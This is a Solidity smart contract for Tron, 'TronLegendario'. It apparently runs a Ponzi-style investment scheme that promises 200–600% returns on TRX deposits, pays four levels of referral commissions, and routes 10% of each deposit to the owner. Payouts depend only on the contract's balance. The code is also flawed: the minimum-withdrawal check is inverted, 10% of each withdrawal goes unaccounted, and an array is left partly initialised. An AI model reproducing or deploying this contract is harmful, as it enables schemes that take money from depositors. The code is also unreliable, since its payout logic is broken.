pragma solidity ^0.5.14;

import "./SafeMath.sol";

contract TronLegendario {
  using SafeMath for uint;
 
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint public MIN_DEPOSIT = 100 trx;
  uint public MIN_RETIRO = 20 trx;

  uint public RETIRO_DIARIO = 100000 trx;
  uint public ULTIMO_REINICIO;

  address payable public owner;
  address public NoValido;
  bool public Do;

  uint[4] public porcientos = [5, 3, 2, 1];
  
  uint[5] public tiempo = [ 100 * 28800, 100 * 28800, 100 * 28800, 100 * 28800, 100 * 28800];
  uint[5] public porcent = [ 200, 300, 400, 600];

  uint public paso = 7000000 trx;
  uint public tarifa = 0;
  
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;
  
  constructor() public {
    owner = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = owner;

    ULTIMO_REINICIO = block.number;

    totalInvestors++;
    

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContract() public view returns (uint){
    return address(this).balance;
  }
  
  function setTarifa() internal returns(uint){
      
      if(InContract() < paso){
          tarifa = 0;
      }
      
      if(InContract() >= paso && InContract() < 2*paso){
          tarifa = 1;
      }
      
      if(InContract() >= 2*paso && InContract() < 3*paso){
          tarifa = 2;
      }
      
      if(InContract() >= 3*paso ){
          tarifa = 3;
      }
      
      return tarifa;
      
  }

  function setOwner(address payable _owner) public returns (address){
    require (msg.sender == owner);
    require (_owner != owner);

    owner = _owner;
    investors[owner].registered = true;
    investors[owner].sponsor = owner;

    totalInvestors++;

    return owner;
  }
  
  function register(address _sponsor) external {

    require ( !investors[msg.sender].registered, "You are already registered");
    require ( investors[_sponsor].registered, "Your SPONSOR already registered" );
    require ( _sponsor != NoValido, "your SPONSOR is an invalid address");

    investors[msg.sender].registered = true;
    totalInvestors++;

    investors[msg.sender].sponsor = _sponsor;

  }

  function column (address yo) public view returns(address[4] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[2] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[3] = investors[yo].sponsor;

    return res;
  }

  function rewardReferers(address yo, uint amount) internal {

    address[4] memory referi = column(yo);
    uint[4] memory a;
    uint[4] memory b;

    for (uint i = 0; i < 4; i++) {
      if (investors[referi[i]].registered && referi[i] != owner ) {

        b[i] = porcientos[i];
        a[i] = amount.mul(b[i]).div(100);

        investors[referi[i]].balanceRef += a[i];
        investors[referi[i]].totalRef += a[i];
        totalRefRewards += a[i];
     
      }else{

        b[i] = porcientos[i];
        a[i] = amount.mul(b[i]).div(100);

        investors[referi[i]].balanceRef += a[i];
        investors[referi[i]].totalRef += a[i];
        totalRefRewards += a[i];
        
        break;
      }
    }
    
    
  }
  
  
  function deposit() external payable {
    require(msg.value >= MIN_DEPOSIT, "Send more TRX");
    require (investors[msg.sender].registered, "You are not registered");
    

    setTarifa();
    investors[msg.sender].deposits.push(Deposit(tarifa, msg.value, block.number));
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    owner.transfer(msg.value.mul(10).div(100));

    rewardReferers(msg.sender, msg.value);

    reInicio();

  }
  
  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }

  function reInicio() public {

    uint hora = ULTIMO_REINICIO + 1*28800;

    if ( block.number >= hora ){

      RETIRO_DIARIO = 100000 trx;
      ULTIMO_REINICIO = hora;

    }
    
  }
  
  
  function withdraw() external {

    uint amount = profit();
    reInicio();
    require ( InContract() >= amount, "The contract has no balance");
    require ( MIN_RETIRO >= amount, "Te minimum withdrawal is 20 TRX");
    require ( RETIRO_DIARIO >= amount, "Daily withdrawal limit reached");

    uint amount20 = amount.mul(20).div(100);
    uint amount70 = amount.mul(70).div(100);

    if ( msg.sender.send(amount70) ) {

      RETIRO_DIARIO -= amount;

      investors[msg.sender].withdrawn += amount70;
      investors[msg.sender].invested += amount20;
      
      investors[msg.sender].deposits.push(Deposit(tarifa, amount20, block.number));
      
      totalInvested += amount20;
    
    }
    
  }

  function () external payable {}  
  
}